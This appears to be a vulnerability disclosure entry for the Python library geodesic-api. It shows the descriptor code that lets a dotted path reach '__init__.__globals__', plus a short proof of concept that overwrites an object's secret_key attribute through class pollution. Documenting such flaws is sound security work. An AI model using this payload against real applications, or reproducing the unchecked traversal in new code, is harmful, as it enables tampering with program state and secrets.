## geodesic-api

### Meta

+ Library: geodesic-api
+ Stars: N/A
+ Version: 0.66.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```desc = descriptors._BaseDescr("__init__.__globals__.obj"); desc.__set_name__(name="secret_key", owner=None); desc._set_object(obj, "polluted")```
+ Foundby: Zhong
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://pypi.org/project/geodesic-api/

### Vulnerable Code Snippet

```
def __traverse_nested_objects(self, obj: object) -> object:
    for f in self.nested:
        # Does it have a descriptor for this nested field? If so, use it
        desc = getattr(obj.__class__, f, None)
        # There is a descriptor or it has this attribute, use getattr
        if desc is not None or hasattr(obj, f):
            try:
                obj = getattr(obj, f)
            except Exception:
                setattr(obj, f, {})
                obj = getattr(obj, f)
        else:
            try:
                obj = obj[f]
            except KeyError:
                obj[f] = {}
                obj = obj[f]
    return obj

def _set_object(self, obj: object, value: object) -> None:
    if self.nested is None:
        return obj._set_item(self.dict_name, value)

    nestedObj = self.__traverse_nested_objects(obj)

    desc = getattr(nestedObj.__class__, self.public_name, None)
    if desc is not None:
        setattr(nestedObj, self.public_name, value)
    else:
        nestedObj[self.dict_name] = value
```
### PoC

```
import geodesic.descriptors as descriptors
import random

class Animal:
  secret_key = "secret_key"
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

desc = descriptors._BaseDescr("__init__.__globals__.obj")
desc.__set_name__(name="secret_key", owner=None)
desc._set_object(obj, "polluted")

print(obj.secret_key)
```